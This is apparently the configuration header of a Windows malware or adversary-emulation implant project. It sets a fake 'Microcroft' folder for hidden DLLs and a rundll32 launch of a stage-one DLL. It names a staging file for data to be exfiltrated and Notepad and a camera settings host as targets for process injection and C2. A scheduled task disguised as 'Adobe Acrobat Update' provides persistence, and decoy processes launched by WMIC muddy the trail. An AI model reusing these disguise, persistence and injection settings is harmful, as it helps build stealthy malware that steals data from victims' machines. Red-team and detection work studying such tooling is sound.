//Contains config settings for the project. 

#pragma once
#pragma warning(disable : 4996)
#include "Struct.h"
#define _WIN32_DCOM

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
#include <wincred.h>
//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

DWORD ProcessID;
WCHAR DLLPath[MAX_PATH];
WCHAR ProcessName[MAX_PATH];

std::string dllpath1 = "C:\\ProgramData\\Microcroft\\abc.dll"; # Fake microsoft folder (micro*c*roft)
const WCHAR* wdllpath1 = L"C:\\ProgramData\\Microcroft\\abc.dll";
std::string dllpath2 = "C:\\ProgramData\\Microcroft\\def.dll";
const WCHAR* wdllpath2 = L"C:\\ProgramData\\Microcroft\\def.dll";

std::string ExeDirPath = "C:\\ProgramData\\Microcroft";
LPCWSTR Exepath = L"C:\\Windows\\System32\\Rundll32.exe C:\\ProgramData\\Microcroft\\stage1.dll,trr";

//the txt file that gathered data is sent to before being exfilled
LPCWSTR ExfilPath = L"C:\\temp\\ex.txt";
char ExfilPathChar[] = "C:\\temp\\ex.txt";

//process that will be launched and injected into for C2
LPCWSTR InjProc = L"C:\\Windows\\System32\\Notepad.exe";
LPCWSTR InjProcC = L"Notepad.exe";

//process that will be launched and injected into for writing blank file
LPCWSTR InjProc2 = L"C:\\Windows\\System32\\CameraSettingsUIHost.exe";
LPCWSTR InjProcC2 = L"CameraSettingsUIHost.exe";

int PowershellSleepDelay = 30000; // MS

//Red herring executables to also be launched by WMIC. They do nothing. 
LPCWSTR RedH1 = L"C:\\Windows\\System32\\calc.exe";
LPCWSTR RedH2 = L"C:\\Windows\\System32\\cmd.exe";
LPCWSTR RedH3 = L"C:\\Windows\\System32\\SnippingTool.exe";

// task schedule
LPCWSTR wszTaskName = L"Adobe Acrobat Update";
_bstr_t author = L"Adobe";
_bstr_t triggerId = L"Trigger1";
_bstr_t startBoundary = L"2022-01-01T12:05:00";
_bstr_t endBoundary = L"2023-05-02T12:05:00";
short daysInterval = 1;
_bstr_t duration = L"PT4M";
_bstr_t interval = L"PT1M";


void ParseCommandLineArgument(int argc, WCHAR* argv[]);
DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]);

void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
    int InjectionType = 1;
    int index = 0;
    switch (InjectionType) {
    case 1:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    default:
        exit(0);
        break;
    }
}

DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]) {
    for (int i = 0; i < argc; i++) {
        if (wcscmp(argv[i], ArgumentValue) == 0 && i < argc - 1) {
            return i + 1;
        }
    }
    int InjectionType = _wtoi(argv[1]);
    if (InjectionType != 6) {
        printf("Suppy Argument for the %S Switch\n", ArgumentValue);
        exit(0);
    }
    return -1;
}
